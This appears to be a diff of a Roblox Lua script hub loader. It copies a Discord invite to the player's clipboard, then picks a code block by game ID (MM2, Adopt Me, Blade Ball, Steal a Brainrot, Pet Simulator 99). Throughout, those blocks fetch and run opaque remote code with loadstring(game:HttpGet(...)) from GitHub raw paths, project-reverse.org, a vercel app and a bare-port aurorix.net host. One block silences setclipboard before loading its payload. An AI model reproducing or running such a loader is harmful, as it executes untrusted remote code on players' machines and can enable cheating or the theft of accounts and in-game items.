@@ -1,33 +1,50 @@
+local player = game:GetService("Players").LocalPlayer
+if not player then 
+    repeat task.wait() until game:GetService("Players").LocalPlayer 
+    player = game:GetService("Players").LocalPlayer
+end
+
 setclipboard("https://discord.gg/6GMJFxGaJz")
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Discord Server",
+    Text = "Discord invite copied to clipboard",
+    Duration = 5,
+    Button1 = "OK",
+    Callback = function()
+        print("ok")
+    end
+})
+
+-- Fixed: Changed playerGui to player.PlayerGui
+local playerGui = player:WaitForChild("PlayerGui")
+local notification = playerGui:FindFirstChild("Notification")
+if notification then
+    notification:Destroy()
+end
+
 local placeId = game.PlaceId
 
-local scripts = {
-    [142823291] = [[
+local groups = {
+    mm2 = {142823291, 335132309, 636649648},
+    adm = {920587237},
+    bladeball = {15264892126, 16281300371, 14732610803, 15234596844, 13772394625},
+    sab = {109983668079237, 96342491571673},
+    ps99 = {8737899170}
+}
+
+local groupScripts = {
+    mm2 = [[
 loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/testmchoose"))()
+print("mm2")
     ]],
 
-    [8737899170] = [[
-loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/testd3"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/load"))()
-    ]],
-
-    [920587237] = [[
+    adm = [[
 loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/testm"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/admaf"))()
--- loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjY3MTBjOTYyLTcxOTItNDcxYi04ZjQyLWNmOWExYThjNGFiNSIsImtpbmQiOiJtZWRpYSIsInZpc3VhbCI6eyJpZCI6InVuaXZlcnNhbCJ9fQ"))()
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjY3MTBjOTYyLTcxOTItNDcxYi04ZjQyLWNmOWExYThjNGFiNSIsImtpbmQiOiJtZWRpYSJ9"))()
+print("adm")
     ]],
 
-    [126884695634066] = [[
-loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/testm"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/load"))()
-    ]],
-
-[127742093697776] = [[
-loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/testm"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/load"))()
-    ]],
-
-[13772394625] = [[
+    bladeball = [[
 task.spawn(function()
     pcall(function()
         loadstring(game:HttpGet("https://blyatscripts.vercel.app/lo"))()
@@ -35,15 +52,16 @@ task.spawn(function()
 end)
 task.spawn(function()
     pcall(function()
-CLIENT_ID = "498b638b8a0d40eb"
-GAME = "bladeball"
-loadstring(game:HttpGet("http://d20.aurorix.net:25701/script/bladeball"))()
+        CLIENT_ID = "498b638b8a0d40eb"
+        GAME = "bladeball"
+        loadstring(game:HttpGet("http://d20.aurorix.net:25701/script/bladeball"))()
     end)
 end)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/blade-ball-tuffness"))()
-]],
+print("bb")
+    ]],
 
-[109983668079237] = [[
+    sab = [[
 task.spawn(function()
     pcall(function()
         loadstring(game:HttpGet("https://blyatscripts.vercel.app/lo"))()
@@ -51,23 +69,39 @@ task.spawn(function()
 end)
 task.spawn(function()
     pcall(function()
-setclipboard = function() return end
-ID="6710c962-7192-471b-8f42-cf9a1a8c4ab5";
-loadstring(game:HttpGet("https://cdn.project-reverse.org/loader.luau"))();
+        setclipboard = function() return end
+        ID = "6710c962-7192-471b-8f42-cf9a1a8c4ab5"
+        loadstring(game:HttpGet("https://cdn.project-reverse.org/loader.luau"))()
     end)
 end)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/sabv"))()
-]],
+print("sab")
+    ]],
 
-    default = [[
-loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/testm"))()
-CLIENT_ID = "498b638b8a0d40eb"
-GAME = "bladeball"
-loadstring(game:HttpGet("http://d20.aurorix.net:25701/script/bladeball"))()
+    ps99 = [[
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/testd3"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/load"))()
+print("ps99")
     ]]
 }
 
-local scriptToRun = scripts[placeId] or scripts.default
+local defaultScript = [[
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/testm"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/load"))()
+print("random")
+]]
+
+local scriptToRun = defaultScript
+
+for groupName, idList in pairs(groups) do
+    for _, id in ipairs(idList) do
+        if id == placeId then
+            scriptToRun = groupScripts[groupName]
+            break
+        end
+    end
+end
+
 local success, err = pcall(function()
     loadstring(scriptToRun)()
 end)
